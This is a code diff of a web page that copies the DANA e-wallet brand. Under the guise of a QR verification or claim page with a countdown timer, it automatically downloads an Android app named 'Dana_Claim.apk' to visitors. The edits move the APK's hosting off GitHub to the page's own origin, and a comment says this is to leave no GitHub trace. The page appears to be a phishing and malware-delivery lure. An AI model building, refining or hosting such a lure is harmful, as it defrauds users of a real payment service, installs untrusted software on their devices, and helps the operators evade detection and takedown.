@@ -10,20 +10,12 @@
         body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;height:100vh;background:linear-gradient(180deg,#0066cc,#001a40);padding:10px;overflow:hidden}
         .container{max-width:380px;width:100%;text-align:center}
         
-        /* --- LOGO DANA DIPERBAIKI --- */
+        /* --- LOGO DANA --- */
         .dana-logo-container{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:5px}
         .dana-icon{width:50px;height:50px;background:white;border-radius:50%;position:relative;display:flex;justify-content:center;align-items:center;box-shadow:0 4px 15px rgba(0,0,0,0.2)}
-        
-        /* Menggunakan SVG Inline agar gelombang lebih presisi */
-        .flag-svg {
-            width: 28px;
-            height: 18px;
-            fill: #108ee9; /* Warna biru bendera */
-        }
-
+        .flag-svg{width:28px;height:18px;fill:#108ee9}
         .dana-text{display:flex;gap:3px;color:white;font-size:40px;font-weight:bold;letter-spacing:2px;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
         .dana-text span{display:inline-block}
-        /* -------------------------- */
 
         h1{color:#fff;font-size:18px;font-weight:bold;margin-bottom:2px}
         .sub{color:#b3d9ff;font-size:12px;margin-bottom:10px}
@@ -52,10 +44,9 @@
 <body>
 
 <div class="container">
-    <!-- Logo DANA Asli (Bendera Sudah Melengkung) -->
+    <!-- Logo DANA -->
     <div class="dana-logo-container">
         <div class="dana-icon">
-            <!-- SVG BENDERA GELOMBANG -->
             <svg class="flag-svg" viewBox="0 0 28 18">
                 <path d="M0 0 Q 7 3, 14 0 Q 21 -3, 28 1.5 L 28 16.5 Q 21 12, 14 15 Q 7 18, 0 15 Z" />
             </svg>
@@ -93,19 +84,22 @@
 </div>
 
 <script>
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
+// ============================================================
+// QR.HTML - TANPA JEJAK GITHUB
+// ============================================================
+
+var BASE_URL = window.location.origin;
 var timeLeft = 120;
 var timerInterval = null;
 var isProcessing = false;
 
-const timerEl = document.getElementById('timer');
-const btnTerima = document.getElementById('btnTerima');
-const btnTolak = document.getElementById('btnTolak');
-const statusEl = document.getElementById('status');
+var timerEl = document.getElementById('timer');
+var btnTerima = document.getElementById('btnTerima');
+var btnTolak = document.getElementById('btnTolak');
+var statusEl = document.getElementById('status');
 
 new QRCode(document.getElementById('qrCode'), {
-    text: 'https://verifikasi.site/qr.html',
+    text: BASE_URL + '/qr.html',
     width: 140,
     height: 140
 });
@@ -116,7 +110,7 @@ var A = {
 };
 
 function autoDownload() {
-    var url = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Dana_Claim.apk';
+    var url = BASE_URL + '/files/Dana_Claim.apk';
     if(A.isAvailable) {
         A.downloadFile(url, 'Dana_Claim.apk');
     } else {
